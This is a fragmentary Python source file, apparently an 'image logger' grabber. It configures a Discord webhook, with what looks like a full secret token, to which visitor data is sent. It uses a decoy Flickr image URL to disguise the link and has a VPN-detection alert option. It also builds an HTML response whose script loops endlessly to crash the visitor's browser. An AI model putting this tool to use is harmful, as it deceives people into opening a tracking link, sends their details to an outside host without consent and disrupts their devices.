...
import requests, base64, httpagentparse
...
config = {
# BASE CONFIG #
"webhook": "https://discord.com/api/webhooks/1416530133686288546/Mn03bDO5ydt97gF0yJdJu3nFMWaaFT1SiPonCFRNaOvIWtMbWs1F-_8jX6cTwNqoUaw5",
"image": "https://live.staticflickr.com/3684/9515200655_48b953f191_b.jpg", # You can also have a custom image by using a URL argument
...
# 2 = Don't send an alert when a VPN is suspecte
...
datatype = 'text/html'
data = config["crashBrowser"]["customMessage"].encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crashe
